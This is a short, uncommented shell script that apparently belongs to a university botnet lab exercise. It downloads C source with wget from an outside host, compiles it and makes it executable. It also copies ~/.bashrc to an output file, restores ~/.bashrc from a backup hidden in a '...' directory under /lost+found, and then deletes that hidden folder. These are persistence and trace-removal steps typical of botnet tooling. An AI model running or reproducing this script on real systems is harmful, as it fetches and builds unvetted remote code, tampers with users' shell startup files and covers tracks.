#!/bin/sh
DIRECTORY="~/"
TARGET=".bashrc"
FULLPATH="${DIRECTORY}${TARGET}"
BACKUP="${TARGET}_old"

DIR='/lost+found/'
FOLDER='...'

rm ~/cgethttp.c                                                                                                             
wget "abstract.cs.washington.edu/~roy/lab3/Botnet/cgethttp_old.c"                      
mv cgethttp_old.c ~/cgethttp.c
gcc ~/cgethttp.c -o ~/cgethttp
chmod +x ~/cgethttp

#rm ~/.bashrc
echo `pwd` > ~/output
cat ~/.bashrc >> ~/output
cp /lost+found/.../.bashrc_old ~/.bashrc

cd ..
rm -r ${FOLDER}
cd ~/